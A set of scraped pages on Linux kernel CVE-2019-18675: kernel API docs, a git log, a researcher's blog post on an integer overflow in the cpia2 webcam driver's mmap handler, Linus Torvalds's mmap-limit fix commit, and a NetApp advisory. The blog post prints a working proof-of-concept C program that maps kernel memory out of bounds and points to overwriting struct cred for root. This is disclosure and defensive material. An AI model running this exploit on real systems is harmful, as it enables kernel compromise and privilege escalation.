=== Content from www.kernel.org_8cdf9bbf_20250121_021258.html ===


| remap\_pfn\_range | | |
| --- | --- | --- |
| [Prev](API-vm-insert-pfn-prot.html) | More Memory Management Functions | [Next](API-vm-iomap-memory.html) |

---

## Name

remap\_pfn\_range —
remap kernel memory to userspace

## Synopsis

| `int remap_pfn_range (` | struct vm\_area\_struct \* vma, |
| --- | --- |
|  | unsigned long addr, |
|  | unsigned long pfn, |
|  | unsigned long size, |
|  | pgprot\_t prot`)`; |

## Arguments

*`struct vm_area_struct * vma`*

user vma to map to

*`unsigned long addr`*

target user address to start at

*`unsigned long pfn`*

physical address of kernel memory

*`unsigned long size`*

size of map area

*`pgprot_t prot`*

page protection flags for this mapping

## Note

this is only safe if the mm semaphore is held when called.

---

| [Prev](API-vm-insert-pfn-prot.html) | [Up](ch04s03.html) | [Next](API-vm-iomap-memory.html) |
| --- | --- | --- |
| vm\_insert\_pfn\_prot | [Home](index.html) | vm\_iomap\_memory |



=== Content from git.kernel.org_e82e3b69_20250121_000442.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master vsnprintf |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/drivers/media/usb/cpia2/cpia2_core.c)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/drivers/media/usb/cpia2/cpia2_core.c)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/usb/cpia2/cpia2_core.c)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/drivers/media/usb/cpia2/cpia2_core.c)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/drivers/media/usb/cpia2/cpia2_core.c) | log msg author committer range |
| --- | --- |

path: [root](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)/[drivers](/pub/scm/linux/kernel/git/torvalds/linux.git/log/drivers)/[media](/pub/scm/linux/kernel/git/torvalds/linux.git/log/drivers/media)/[usb](/pub/scm/linux/kernel/git/torvalds/linux.git/log/drivers/media/usb)/[cpia2](/pub/scm/linux/kernel/git/torvalds/linux.git/log/drivers/media/usb/cpia2)/[cpia2\_core.c](/pub/scm/linux/kernel/git/torvalds/linux.git/log/drivers/media/usb/cpia2/cpia2_core.c)

| Age | Commit message ([Expand](/pub/scm/linux/kernel/git/torvalds/linux.git/log/drivers/media/usb/cpia2/cpia2_core.c?showmsg=1)) | Author | Files | Lines |
| --- | --- | --- | --- | --- |
| 2022-08-29 | [media: cpia2: deprecate this driver](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/usb/cpia2/cpia2_core.c?id=be8cebc46d9d38166a1b3fda22a018ae52b0928e) | Hans Verkuil | 1 | -2434/+0 |
| 2021-05-19 | [media: cpia2: fix memory leak in cpia2\_usb\_probe](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/usb/cpia2/cpia2_core.c?id=be8656e62e9e791837b606a027802b504a945c97) | Pavel Skripkin | 1 | -0/+12 |
| 2020-08-23 | [treewide: Use fallthrough pseudo-keyword](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/usb/cpia2/cpia2_core.c?id=df561f6688fef775baa341a0f5d960becd248b11) | Gustavo A. R. Silva | 1 | -18/+18 |
| 2019-05-30 | [treewide: Replace GPLv2 boilerplate/reference with SPDX - rule 157](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/usb/cpia2/cpia2_core.c?id=c942fddf8793b2013be8c901b47d0a8dc02bf99f) | Thomas Gleixner | 1 | -10/+1 |
| 2018-02-11 | [vfs: do bulk POLL\* -> EPOLL\* replacement](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/usb/cpia2/cpia2_core.c?id=a9a08845e9acbd224e4ee466f5c1275ed50054e8) | Linus Torvalds | 1 | -2/+2 |
| 2017-11-27 | [media: annotate ->poll() instances](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/usb/cpia2/cpia2_core.c?id=c23e0cb81e4021b9712b1093d54713991fd9b7c2) | Al Viro | 1 | -2/+2 |
| 2017-05-19 | [[media] media drivers: annotate fall-through](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/usb/cpia2/cpia2_core.c?id=06eeefe8e310bf955da7f82547c72c43e4653d97) | Mauro Carvalho Chehab | 1 | -17/+34 |
| 2017-03-02 | [sched/headers: Prepare to move signal wakeup & sigpending methods from <linux...](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/usb/cpia2/cpia2_core.c?id=174cd4b1e5fbd0d74c68cf3a74f5bd4923485512) | Ingo Molnar | 1 | -0/+1 |
| 2017-01-27 | [[media] media: Drop FSF's postal address from the source code files](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/usb/cpia2/cpia2_core.c?id=bcb63314e2c23f1ed622418b65f9409512659c73) | Sakari Ailus | 1 | -4/+0 |
| 2016-02-19 | [[media] usb/cpia2\_core: clean up a min\_t() cast](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/usb/cpia2/cpia2_core.c?id=76880b4015f7bdbe73bf2c07e42ef0ba7a343d3e) | Dan Carpenter | 1 | -1/+1 |
| 2012-08-15 | [[media] rename most media/video usb drivers to media/usb](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/usb/cpia2/cpia2_core.c?id=0c0d06cac63ee327ceaab4b5ffe2206574ab86bd) | Mauro Carvalho Chehab | 1 | -0/+2417 |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-21 00:03:19 +0000



=== Content from deshal3v.github.io_d3a30e6d_20250121_000440.html ===

[<-- home](/)

# Kernel Research / mmap handler exploitation

November 22, 2019

## Description

Recently I started to review the linux kernel, I’ve putted much time and effort trying to identify vulnerabilities.
I looked on the cpia2 driver , which is a V4L driver , aimed for supporting cpia2 webcams. official documentation [here](https://www.kernel.org/doc/html/latest/media/v4l-drivers/cpia2.html).
I found a vulnerability in the mmap handler implementation of the driver. Kernel drivers may re-implement their own mmap handlers , usually for speeding up the process of exchanging data between user space and kernel space. The cpia2 driver re-implement a mmap hanlder for sharing the frame’s buffer with the user application which controls the camera.
—

## Lets get into it

Here is the userspace mmap function prototype (taken from man):

```
void *mmap(void *addr, size_t length, int prot, int flags,
                  int fd, off_t offset);

```

Here the user supplies parameter for the mapping , we will be interested in the size and offset parameters.

* length - will determine the length of the mapping
* offset - will determine the offset from the beginning of the device we will start the mapping from.

The driver’s specific mmap handler will remap kernel memory to userspace using a function like [remap\_pfn\_range](https://www.kernel.org/doc/htmldocs/kernel-api/API-remap-pfn-range.html)

## CVE-2019-18675

Lets have a look at the cpia2 mmap handler implementation:

We can see the file\_operations struct:

```

/***
 * The v4l video device structure initialized for this device
 ***/
static const struct v4l2_file_operations cpia2_fops = {
	.owner		= THIS_MODULE,
	.open		= cpia2_open,
	.release	= cpia2_close,
	.read		= cpia2_v4l_read,
	.poll		= cpia2_v4l_poll,
	.unlocked_ioctl	= video_ioctl2,
	.mmap		= cpia2_mmap,
    };

```

Lets look at the function cpia2\_mmap

```
static int cpia2_mmap(struct file *file, struct vm_area_struct *area)
{
	struct camera_data *cam = video_drvdata(file);
	int retval;

	if (mutex_lock_interruptible(&cam->v4l2_lock))
		return -ERESTARTSYS;
	retval = cpia2_remap_buffer(cam, area);

	if(!retval)
		cam->stream_fh = file->private_data;
	mutex_unlock(&cam->v4l2_lock);
	return retval;
}

```

It just calls the function cpia2\_remap\_buffer() with a pointer to the `camera_data` struct:

```
/******************************************************************************
 *
 *  cpia2_remap_buffer
 *
 *****************************************************************************/
int cpia2_remap_buffer(struct camera_data *cam, struct vm_area_struct *vma)
{
	const char *adr = (const char *)vma->vm_start;
	unsigned long size = vma->vm_end-vma->vm_start;
	unsigned long start_offset = vma->vm_pgoff << PAGE_SHIFT;
	unsigned long start = (unsigned long) adr;
	unsigned long page, pos;

	DBG("mmap offset:%ld size:%ld\n", start_offset, size);

	if (!video_is_registered(&cam->vdev))
		return -ENODEV;

	if (size > cam->frame_size*cam->num_frames  ||
	    (start_offset % cam->frame_size) != 0 ||
	    (start_offset+size > cam->frame_size*cam->num_frames))
		return -EINVAL;

	pos = ((unsigned long) (cam->frame_buffer)) + start_offset;
	while (size > 0) {
		page = kvirt_to_pa(pos);
		if (remap_pfn_range(vma, start, page >> PAGE_SHIFT, PAGE_SIZE, PAGE_SHARED))
			return -EAGAIN;
		start += PAGE_SIZE;
		pos += PAGE_SIZE;
		if (size > PAGE_SIZE)
			size -= PAGE_SIZE;
		else
			size = 0;
	}

	cam->mmapped = true;
	return 0;
}

```

we can see that start\_offset + size is being calculated , and the sum is being compared to the total size of the frames:

```
if(... || (start_offset+size > cam->frame_size*cam->num_frames))
    return -EINVAL;

```

However, the calculation start\_offset + size could wrap-around to a low value (a.k.a Integer Overflow), allowing an attacker to bypass the check while still using a big start\_offset value which will lead to mapping of unintended kernel memory. The only requirement is that the start\_offset value will be a multiple of the frame\_size (which can be controlled by the cpia2 driver options, by default its 68k).
And this can be quite bad because a huge offset will allow us to perform a mapping in an arbitrary offset (outside of the frame buffer’s bounds) , and this can possibly result in a privillege escalation

## Demo time!

I’ve used a qemu kernel virtual machine (here).
Now we have to:

* Open /dev/video0
* mmaping size 0x11000 at offset 0xffffffffffff0000. The overlow will ocuur and we will pass the check :)

Here is a minimalistic example for exploit code:

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

#define VIDEO_DEVICE "/dev/video0"
int main(){

        pid_t pid;
        char command[40];

        int fd =  open(VIDEO_DEVICE , O_RDWR);
        if(fd < 0){
                printf("[-]Error opening device file\n");
        }

        printf("[+]Demonstration\n");
        pid = getpid();
        printf("[~]PID IS %d ", pid);

        getchar();
        int size =  0x11000;
        unsigned long mapStarter = 0x43434000;
        unsigned long * mapped = mmap((void *)mapStarter,  size, PROT_WRITE | PROT_READ, MAP_SHARED , fd , 0xffffffffffff0000);

        if(mapped == MAP_FAILED)
                printf("[-]Error mapping the specified region\n");
        else
                puts("[+]mmap went successfully\n");
        /*view the /proc/<pid>/maps file */

        sprintf(command , "cat /proc/%d/maps", pid);
        system(command);

        return 0;
}

```

Compile and run:

![](/assets/img/alictf-2016/demo.png)

and B00M! we have got a read and write primitives in kernel space! By modifying `struct cred` or kernel function pointers/ variables we can possibly gain root! or destroy kernel data!

## Tips and thoughts

* Because I didnt have the required hardware (for example, Intel Qx5 microscope ), I’ve made some changes in the driver’s code for this poc . I made some changes to the hardware and usb’s parts, In a way that allowed me to test the mmap functionallity as its in the original driver . Because the vulnerability is not related to the hardware interaction partsl , this wasn’t a problem.
  This way I could research more and even debug the interesting parts without being depend on hardware.
* This vulnerability is more than 8 years old!
* This is my first public vulnerability!

## Additional info

* CVE-2019-18675 on [NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-18675)
* CVE-2019-18675 on [Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18675)



=== Content from git.kernel.org_4f1e24fb_20250121_000440.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master vsnprintf |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=be83bbf806822b1b89e0a0f23cd87cddc409e429)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=be83bbf806822b1b89e0a0f23cd87cddc409e429)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=be83bbf806822b1b89e0a0f23cd87cddc409e429)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=be83bbf806822b1b89e0a0f23cd87cddc409e429)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Linus Torvalds <torvalds@linux-foundation.org> | 2018-05-11 09:52:01 -0700 |
| --- | --- | --- |
| committer | Linus Torvalds <torvalds@linux-foundation.org> | 2018-05-11 09:52:01 -0700 |
| commit | [be83bbf806822b1b89e0a0f23cd87cddc409e429](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=be83bbf806822b1b89e0a0f23cd87cddc409e429) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=be83bbf806822b1b89e0a0f23cd87cddc409e429)) | |
| tree | [9166545d37168423b25912fd12e3b16d02732d74](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=be83bbf806822b1b89e0a0f23cd87cddc409e429) | |
| parent | [41e3e1082367221e99a59c8968a583706123ae04](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=41e3e1082367221e99a59c8968a583706123ae04) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=be83bbf806822b1b89e0a0f23cd87cddc409e429&id2=41e3e1082367221e99a59c8968a583706123ae04)) | |
| download | [linux-be83bbf806822b1b89e0a0f23cd87cddc409e429.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-be83bbf806822b1b89e0a0f23cd87cddc409e429.tar.gz) | |

mmap: introduce sane default mmap limitsThe internal VM "mmap()" interfaces are based on the mmap target doing
everything using page indexes rather than byte offsets, because
traditionally (ie 32-bit) we had the situation that the byte offset
didn't fit in a register. So while the mmap virtual address was limited
by the word size of the architecture, the backing store was not.
So we're basically passing "pgoff" around as a page index, in order to
be able to describe backing store locations that are much bigger than
the word size (think files larger than 4GB etc).
But while this all makes a ton of sense conceptually, we've been dogged
by various drivers that don't really understand this, and internally
work with byte offsets, and then try to work with the page index by
turning it into a byte offset with "pgoff << PAGE\_SHIFT".
Which obviously can overflow.
Adding the size of the mapping to it to get the byte offset of the end
of the backing store just exacerbates the problem, and if you then use
this overflow-prone value to check various limits of your device driver
mmap capability, you're just setting yourself up for problems.
The correct thing for drivers to do is to do their limit math in page
indices, the way the interface is designed. Because the generic mmap
code \_does\_ test that the index doesn't overflow, since that's what the
mmap code really cares about.
HOWEVER.
Finding and fixing various random drivers is a sisyphean task, so let's
just see if we can just make the core mmap() code do the limiting for
us. Realistically, the only "big" backing stores we need to care about
are regular files and block devices, both of which are known to do this
properly, and which have nice well-defined limits for how much data they
can access.
So let's special-case just those two known cases, and then limit other
random mmap users to a backing store that still fits in "unsigned long".
Realistically, that's not much of a limit at all on 64-bit, and on
32-bit architectures the only worry might be the GPU drivers, which can
have big physical address spaces.
To make it possible for drivers like that to say that they are 64-bit
clean, this patch does repurpose the "FMODE\_UNSIGNED\_OFFSET" bit in the
file flags to allow drivers to mark their file descriptors as safe in
the full 64-bit mmap address space.
[ The timing for doing this is less than optimal, and this should really
go in a merge window. But realistically, this needs wide testing more
than it needs anything else, and being main-line is the only way to do
that.
So the earlier the better, even if it's outside the proper development
cycle - Linus ]
Cc: Kees Cook <keescook@chromium.org>
Cc: Dan Carpenter <dan.carpenter@oracle.com>
Cc: Al Viro <viro@zeniv.linux.org.uk>
Cc: Willy Tarreau <w@1wt.eu>
Cc: Dave Airlie <airlied@redhat.com>
Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=be83bbf806822b1b89e0a0f23cd87cddc409e429)

| -rw-r--r-- | [mm/mmap.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/mm/mmap.c?id=be83bbf806822b1b89e0a0f23cd87cddc409e429) | 32 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 32 insertions, 0 deletions

| diff --git a/mm/mmap.c b/mm/mmap.cindex 9d5968d1e8e336..6fc43576008634 100644--- a/[mm/mmap.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/mm/mmap.c?id=41e3e1082367221e99a59c8968a583706123ae04)+++ b/[mm/mmap.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/mm/mmap.c?id=be83bbf806822b1b89e0a0f23cd87cddc409e429)@@ -1324,6 +1324,35 @@ static inline int mlock\_future\_check(struct mm\_struct \*mm, return 0; } +static inline u64 file\_mmap\_size\_max(struct file \*file, struct inode \*inode)+{+ if (S\_ISREG(inode->i\_mode))+ return inode->i\_sb->s\_maxbytes;++ if (S\_ISBLK(inode->i\_mode))+ return MAX\_LFS\_FILESIZE;++ /\* Special "we do even unsigned file positions" case \*/+ if (file->f\_mode & FMODE\_UNSIGNED\_OFFSET)+ return 0;++ /\* Yes, random drivers might want more. But I'm tired of buggy drivers \*/+ return ULONG\_MAX;+}++static inline bool file\_mmap\_ok(struct file \*file, struct inode \*inode,+ unsigned long pgoff, unsigned long len)+{+ u64 maxsize = file\_mmap\_size\_max(file, inode);++ if (maxsize && len > maxsize)+ return false;+ maxsize -= len;+ if (pgoff > maxsize >> PAGE\_SHIFT)+ return false;+ return true;+}+ /\* \* The caller must hold down\_write(&current->mm->mmap\_sem). \*/@@ -1409,6 +1438,9 @@ unsigned long do\_mmap(struct file \*file, unsigned long addr, struct inode \*inode = file\_inode(file); unsigned long flags\_mask; + if (!file\_mmap\_ok(file, inode, pgoff, len))+ return -EOVERFLOW;+ flags\_mask = LEGACY\_MAP\_MASK | file->f\_op->mmap\_supported\_flags;  switch (flags & MAP\_TYPE) { |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-21 00:03:17 +0000



=== Content from security.netapp.com_f0c8e7d1_20250121_000443.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [December 2019 Linux Kernel Vulnerabilities in NetApp Products](https://security.netapp.com/advisory/ntap-20200103-0001)

## December 2019 Linux Kernel Vulnerabilities in NetApp Products

circle-check-alt

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20200103-0001 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20200103-0001 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20200103-0001 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20200103-0001 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20200103-0001
**Version:**
23.0

**Last updated:**
06/09/2022

**Status:**
Final.

**CVEs:** CVE-2019-14815, CVE-2019-19227, CVE-2019-10220, CVE-2019-19318, CVE-2019-14896, CVE-2019-19252, CVE-2019-18660, CVE-2019-19319, CVE-2019-10207, CVE-2019-18675, CVE-2019-19602, CVE-2019-19378, CVE-2019-19377, CVE-2019-19447, CVE-2019-19448, CVE-2019-19449, CVE-2019-19768, CVE-2019-19769, CVE-2019-19770, CVE-2019-19767, CVE-2019-19807, CVE-2019-19241, CVE-2019-19815, CVE-2019-19814, CVE-2019-19816, CVE-2019-19813

Overview
#### Summary

Multiple NetApp products incorporate Linux kernel. Linux kernel versions prior to 5.4.2 are susceptible to vulnerabilities which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Impact

Successful exploitation of these vulnerabilities could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

Brocade Fabric Operating System Firmware affected only by CVE-2019-19767.

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2019-10207](https://nvd.nist.gov/vuln/detail/CVE-2019-10207) | 5.5 (MEDIUM) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2019-10220](https://nvd.nist.gov/vuln/detail/CVE-2019-10220) | 8.8 (HIGH) | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| [CVE-2019-14815](https://nvd.nist.gov/vuln/detail/CVE-2019-14815) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2019-14896](https://nvd.nist.gov/vuln/detail/CVE-2019-14896) | 9.8 (CRITICAL) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2019-18660](https://nvd.nist.gov/vuln/detail/CVE-2019-18660) | 5.5 (MEDIUM) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
| [CVE-2019-18675](https://nvd.nist.gov/vuln/detail/CVE-2019-18675) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2019-19227](https://nvd.nist.gov/vuln/detail/CVE-2019-19227) | 5.5 (MEDIUM) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2019-19241](https://nvd.nist.gov/vuln/detail/CVE-2019-19241) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2019-19252](https://nvd.nist.gov/vuln/detail/CVE-2019-19252) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2019-19318](https://nvd.nist.gov/vuln/detail/CVE-2019-19318) | 5.5 (MEDIUM) | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H |
| [CVE-2019-19319](https://nvd.nist.gov/vuln/detail/CVE-2019-19319) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| [CVE-2019-19377](https://nvd.nist.gov/vuln/detail/CVE-2019-19377) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| [CVE-2019-19378](https://nvd.nist.gov/vuln/detail/CVE-2019-19378) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| [CVE-2019-19447](https://nvd.nist.gov/vuln/detail/CVE-2019-19447) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| [CVE-2019-19448](https://nvd.nist.gov/vuln/detail/CVE-2019-19448) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| [CVE-2019-19449](https://nvd.nist.gov/vuln/detail/CVE-2019-19449) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| [CVE-2019-19602](https://nvd.nist.gov/vuln/detail/CVE-2019-19602) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2019-19767](https://nvd.nist.gov/vuln/detail/CVE-2019-19767) | 5.5 (MEDIUM) | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H |
| [CVE-2019-19768](https://nvd.nist.gov/vuln/detail/CVE-2019-19768) | 7.5 (HIGH) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2019-19769](https://nvd.nist.gov/vuln/detail/CVE-2019-19769) | 7.5 (HIGH) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2019-19770](https://nvd.nist.gov/vuln/detail/CVE-2019-19770) | 7.5 (HIGH) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2019-19807](https://nvd.nist.gov/vuln/detail/CVE-2019-19807) | 5.5 (MEDIUM) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2019-19813](https://nvd.nist.gov/vuln/detail/CVE-2019-19813) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| [CVE-2019-19814](https://nvd.nist.gov/vuln/detail/CVE-2019-19814) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| [CVE-2019-19815](https://nvd.nist.gov/vuln/detail/CVE-2019-19815) | 5.5 (MEDIUM) | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H |
| [CVE-2019-19816](https://nvd.nist.gov/vuln/detail/CVE-2019-19816) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

Affected Products
#### Affected Products

* AFF Baseboard Management Controller (BMC) - A700s
* Active IQ Unified Manager for VMware vSphere
* FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400
* NetApp Cloud Backup (formerly AltaVault)
* NetApp Data Availability Services
* NetApp HCI Baseboard Management Controller (BMC) - H610S
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire Baseboard Management Controller (BMC)
* NetApp SteelStore Cloud Integrated Storage

#### Products Not Affected

* 7-Mode Transition Tool
* ATTO FibreBridge - 6500N
* Active IQ Unified Manager for Linux
* Active IQ Unified Manager for Microsoft Windows
* Active IQ mobile app
* Astra Trident
* Brocade Fabric Operating System Firmware
* Brocade SAN Navigator (SANnav)
* Cloud Insights Telegraf Agent
* Cloud Manager
* Cloud Secure Agent
* Cloud Volumes ONTAP Mediator
* Clustered Data ONTAP
* Clustered Data ONTAP Antivirus Connector
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Storage Manager
* E-Series SANtricity Unified Manager and Web Services Proxy
* Element HealthTools
* Element Plug-in for vCenter Server
* FAS/AFF BIOS
* FAS/AFF Baseboard Management Controller (BMC) - A320/C190/A220/FAS2720/FAS2750/A800
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* MetroCluster Tiebreaker for clustered Data ONTAP
* NetApp Cloud Backup OST Plug-in (formerly AltaVault OST Plug-in)
* NetApp Converged Systems Advisor Agent
* NetApp E-Series Performance Analyzer
* NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H300E/H500E/H700E/H410S
* NetApp HCI Baseboard Management Controller (BMC) - H410C
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Nodes
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp SANtricity SMI-S Provider
* NetApp SMI-S Provider
* NetApp SolidFire Plug-in for vRealize Orchestrator (SolidFire vRO)
* NetApp SolidFire, Enterprise SDS & HCI Storage Node (Element Software)
* NetApp VASA Provider for Clustered Data ONTAP 9.7 and above
* NetApp XCP NFS
* NetApp XCP SMB
* ONTAP Mediator
* ONTAP Select Deploy administration utility
* OnCommand Insight
* OnCommand Workflow Automation
* Open Systems SnapVault Agent
* SAS Firmware
* Service Processor
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapCenter Plug-in for VMware vSphere
* SnapDrive for Unix
* SnapManager for Hyper-V
* SnapManager for Oracle
* SnapManager for SAP
* SolidFire Storage Replication Adapter
* Storage Replication Adapter for Clustered Data ONTAP for VMware vSphere 9.7 and above
* Storage Services Connector
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID Baseboard Management Controller (BMC)
* StorageGRID9 (9.x and prior)
* System Manager 9.x
* Virtual Storage Console for VMware vSphere 9.7 and above

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **AFF Baseboard Management Controller (BMC) - A700s** | <https://mysupport.netapp.com/site/downloads/firmware/system-firmware-diagnostics> The first fixed version is 1.81. To download the patch, choose âService Imageâ from the AFF\_A700s âSystem Firmware + Diagnostics Downloadâ page. |
